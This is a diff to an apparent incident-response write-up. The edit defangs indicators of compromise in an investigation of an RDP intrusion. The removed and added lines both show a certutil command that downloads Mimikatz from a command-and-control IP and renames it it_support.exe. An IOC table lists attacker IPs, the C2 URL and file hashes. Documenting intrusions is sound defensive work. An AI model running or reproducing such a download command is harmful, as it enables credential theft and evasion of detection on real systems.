@@ -195,7 +195,7 @@ they were actively working through options.
 Then they ran this command:
 
 
-certutil.exe -urlcache -f http://152.44.44.246:8080/mimikatz.exe it_support.exe
+certutil.exe -urlcache -f hxxp://152.44.44[.]246:8080/mimikatz[.]exe it_support.exe
 
 <img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/8e8b2f1f-aff4-4489-9f04-fb2ec6d021e5" />
 
@@ -256,14 +256,15 @@ at 10:04 PM. Third attempt — blocked.
 
 | Type | Value | Notes |
 |------|-------|-------|
-| IP — External RDP Source | 213.152.187.225 | Confirmed in DeviceLogonEvents — direct attacker IP |
-| IP — Internal Pivot Machine | 10.159.17.126 | Session initiator in process events — needs own investigation |
-| IP — C2 Server | 152.44.44.246:8080 | Mimikatz download source |
+| IP — External RDP Source | 213.152.187[.]225 | Confirmed in DeviceLogonEvents — direct attacker IP |
+| IP — Internal Pivot Machine | 10.159.17[.]126 | Session initiator in process events — needs own investigation |
+| IP — C2 Server | 152.44.44[.]246:8080 | Mimikatz download source |
 | File SHA1 | a61496b21ba4d0bb73b08676bd0066462e0ff2e2 | Wacatac.H!ml ZIP |
 | File SHA1 | 75481f3462f0f1a4b8707f2f67b1b6e96ecef92e | Wacatac.C!ml ZIP |
 | Script SHA256 | b58197ad02b51f9f344a1575feee6562f461d7ce3da3752de9537ad06b9571db | PowerShell certutil script |
 | Masqueraded file | it_support.exe | Mimikatz renamed to evade detection |
-| C2 URL | http://152.44.44.246:8080/mimikatz.exe | Blocked |
+| C2 URL | hxxp://152.44.44[.]246:8080/mimikatz[.]exe | Blocked |
+| Malware source | hxxps://bazaar.abuse[.]ch | MalwareBazaar — ZIP download source |
 
 ---
 
